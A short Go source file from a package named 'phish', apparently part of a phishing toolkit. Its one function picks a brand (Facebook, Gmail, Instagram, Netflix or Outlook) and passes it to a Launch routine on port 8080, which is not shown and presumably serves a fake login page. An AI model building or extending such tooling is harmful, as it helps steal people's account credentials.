package phish

import "os"

func Interact(selectedOption string) {
	switch selectedOption {
	case "Facebook":
		Launch("facebook", 8080)
	case "Gmail":
		Launch("gmail", 8080)
	case "Instagram":
		Launch("instagram", 8080)
	case "Netflix":
		Launch("netflix", 8080)
	case "Outlook":
		Launch("outlook", 8080)
	default:
		os.Exit(1)
	}
}
